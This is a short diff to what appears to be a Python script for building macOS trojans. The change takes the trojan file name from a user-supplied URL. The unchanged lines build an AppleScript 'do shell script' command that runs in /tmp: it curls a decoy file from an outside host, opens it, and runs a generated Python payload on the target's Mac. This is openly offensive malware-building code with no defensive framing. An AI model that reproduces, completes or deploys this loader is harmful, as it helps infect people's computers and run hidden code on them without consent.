@@ -38,7 +38,8 @@ def main():
 	
 	#Generate shell scripts
 	trojanFile = raw_input("\nPlease enter the url to the trojan file you want to be opened on the target's mac (exp:http://ellospics/pics/mypic.jpg):\n>>> ")
-	trojanFileName = raw_input("\nPlease enter the name to the name of the trojan file (exp:mypic.jpg):\n>>> ")
+	trojanFileName = trojanFile.split("/")
+	trojanFileName = trojanFileName[-1]
 	
 	shellScript = "do shell script \"cd /tmp/; curl " + trojanFile + " -O -s; open " + trojanFileName + "; python -c \\\"" + createdPayload + "\\\";\""
 	
